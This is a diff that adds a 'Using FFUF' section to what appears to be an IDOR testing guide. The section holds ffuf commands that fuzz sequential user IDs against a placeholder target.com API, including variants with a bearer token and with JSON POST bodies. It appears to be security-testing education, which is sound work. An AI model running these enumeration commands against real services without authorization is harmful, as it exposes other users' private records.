@@ -222,6 +222,32 @@ Cookie: user_data=eyJ1c2VyX2lkIjoxMjN9
 
 ---
 
+### Using FFUF
+```text
+# Basic IDOR fuzzing with ffuf
+ffuf -u https://target.com/api/user/FUZZ -w numbers.txt -mc 200
+
+# Custom wordlist generation
+seq 1 10000 > ids.txt
+ffuf -u https://target.com/api/user/FUZZ -w ids.txt
+
+# With authentication
+ffuf -u https://target.com/api/user/FUZZ \
+  -w ids.txt \
+  -H "Authorization: Bearer TOKEN" \
+  -mc 200,301,302 \
+  -fs 0
+
+# POST request fuzzing
+ffuf -u https://target.com/api/user \
+  -w ids.txt \
+  -X POST \
+  -d '{"user_id":"FUZZ"}' \
+  -H "Content-Type: application/json"
+```
+
+---
+
 ## Prevention and Mitigation
 
 1. **Continuous user permission validation**  
